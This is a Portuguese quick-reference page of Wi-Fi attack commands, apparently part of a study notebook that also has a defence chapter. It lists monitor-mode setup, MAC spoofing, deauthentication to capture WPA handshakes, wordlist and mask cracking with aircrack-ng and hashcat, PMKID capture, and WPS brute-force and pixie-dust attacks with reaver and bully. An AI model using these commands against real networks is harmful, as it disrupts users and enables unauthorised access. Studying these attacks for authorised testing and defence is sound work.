# 10 — Referência rápida de comandos 🧾

[[00-INDICE|⬅ Voltar ao índice]]

## Setup
```bash
sudo airmon-ng check kill              # matar processos conflitantes
sudo airmon-ng start wlan0             # entrar em modo monitor
sudo airmon-ng stop wlan0mon           # sair do modo monitor
iwconfig                               # ver modo da placa
sudo macchanger -r wlan0               # MAC aleatório
```

## Scan
```bash
sudo airodump-ng wlan0mon                                   # ver tudo
sudo airodump-ng --bssid <BSSID> -c <CH> -w captura wlan0mon # focar alvo
sudo wash -i wlan0mon                                        # APs com WPS
```

## Handshake
```bash
sudo aireplay-ng -0 5 -a <BSSID> -c <CLIENTE> wlan0mon   # deauth (forçar)
aircrack-ng captura-01.cap                               # validar handshake
```

## Quebra (aircrack)
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> captura-01.cap
```

## Quebra (hashcat)
```bash
hcxpcapngtool -o hash.hc22000 captura-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hash.hc22000 --show
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d        # máscara 8 dígitos
```

## PMKID
```bash
sudo hcxdumptool -i wlan0mon -o captura.pcapng
hcxpcapngtool -o pmkid.hc22000 captura.pcapng
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

## WPS
```bash
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -K 1 -vv        # pixie dust
sudo bully wlan0mon -b <BSSID> -c <CH>
```

## Automatizadores
```bash
sudo wifite        # tudo-em-um
sudo airgeddon     # menu interativo
```

## Máscaras do hashcat
| Símbolo | Conjunto |
|---------|----------|
| `?d` | dígitos 0-9 |
| `?l` | letras minúsculas |
| `?u` | letras maiúsculas |
| `?s` | símbolos |
| `?a` | todos acima |

---
[[00-INDICE|⬅ Voltar ao índice]] · [[09-defesa|🛡️ Defesa]]
